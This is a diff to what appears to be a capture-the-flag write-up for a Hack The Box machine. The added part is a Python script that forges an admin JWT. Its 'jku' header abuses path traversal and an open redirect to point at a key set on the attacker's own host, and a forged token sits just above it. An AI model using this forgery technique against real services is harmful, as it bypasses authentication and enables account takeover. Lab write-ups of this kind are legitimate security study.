@@ -279,6 +279,28 @@ public class Main {
 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.rhyqiURChTIPRQ0Lih_NnK56GzVgosn-N3l5u8R0s3CKo61Y3H-GcLRxrvXEHoWuKuwFQmU2rGzsZjmM_Jj8OsbwZc8-nQZJvIDl1fH7I4nMpph-MrXVJHiN9saRvByji6DQgQMcHYgfoH6SfeblGc9ta_MDFkW7ju1njpIB3OU8W8giNP2ZUC_y2RE8SezWi5FcrzNH8WYKRiHbUNovEGK-ACeUZDo4nxbUGPQabEAtDE6nlE7nSfQLcK0RdSTMQ4mSeDajdOHDPyCo1XrzS_I42h8bRJ_y0H50805Yee2v4fslsNlPvq19__TeYpuHEZRbTZ0MU7UL07Oxiy7ykg
 ````
 
+````python
+import json
+from authlib.jose import JsonWebKey
+from authlib.jose import jwt
+
+rsaKey = JsonWebKey.generate_key(kty="RSA", crv_or_size=2048, is_private=1)
+
+json_object = json.loads(rsaKey.as_json())
+json_formatted_str = json.dumps(json_object, indent=2)
+print(json_formatted_str)
+
+header = {'typ': 'JWT',
+          'alg': 'RS256',
+          'jku': 'http://hackmedia.htb/static/../redirect?url=10.10.15.6/jwks.json'
+          }
+payload = {
+     'user': 'admin'
+}
+serialized = jwt.encode(header=header, payload=payload, key=rsaKey)
+print(serialized)
+````
+
 
 # Root
 
